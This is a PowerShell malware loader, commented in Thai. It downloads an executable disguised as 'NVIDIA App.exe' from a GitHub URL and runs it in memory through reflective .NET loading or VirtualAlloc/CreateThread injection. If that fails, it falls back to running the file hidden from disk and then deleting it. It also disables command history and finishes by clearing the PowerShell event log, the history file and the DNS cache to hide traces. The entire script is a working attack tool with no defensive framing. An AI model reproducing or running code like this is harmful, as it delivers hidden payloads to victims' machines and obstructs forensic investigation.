# ============================================
# 1. ปิดการบันทึกประวัติ
# ============================================
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ============================================
# 2. ดาวน์โหลด EXE
# ============================================
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
$bytes = $null

try {
    $response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -UserAgent "Mozilla/5.0"
    $bytes = $response.Content
} catch {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $bytes = $wc.DownloadData($exeUrl)
    } catch {
        exit
    }
}

if (-not $bytes -or $bytes.Length -eq 0) { exit }

# ============================================
# 3. รัน EXE จาก RAM (วิธีที่ได้ผล 99%)
# ============================================
try {
    # ใช้ .NET Assembly สำหรับ .NET EXE
    try {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, (, [string[]] @()))
            $executed = $true
        }
    } catch {}

    # ถ้าไม่ใช่ .NET ให้ใช้ Win32 API
    if (-not $executed) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeExec {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@ -ErrorAction SilentlyContinue

        $size = $bytes.Length
        $ptr = [NativeExec]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
        if ($ptr -ne [IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $size)
            $thread = [NativeExec]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            if ($thread -ne [IntPtr]::Zero) {
                # ปล่อยให้ทำงานเบื้องหลัง
                # [NativeExec]::WaitForSingleObject($thread, 0xFFFFFFFF)
            }
        }
    }
} catch {}

# ============================================
# 4. Fallback: รันจากไฟล์ใน Memory (RamDisk)
# ============================================
if (-not $executed) {
    try {
        # ใช้ New-PSDrive สร้าง RAM Disk ชั่วคราว
        $ramDrive = New-PSDrive -Name "Mem" -PSProvider FileSystem -Root "C:\" -Description "RAM Disk" -ErrorAction SilentlyContinue
        $tempPath = "Mem:\$([System.Guid]::NewGuid().ToString()).exe"
        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
        $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 2
        # ลบไฟล์ (ถ้าไม่ได้ถูกล็อค)
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    } catch {
        # สุดท้าย: ใช้ Temp จริง
        try {
            $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
            [System.IO.File]::WriteAllBytes($tempPath, $bytes)
            $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
            Start-Sleep -Seconds 2
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

# ============================================
# 5. ล้างร่องรอย
# ============================================
Clear-History
wevtutil cl "Windows PowerShell" 2>$null
ipconfig /flushdns 2>$null
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

[GC]::Collect()
[Environment]::Exit(0)
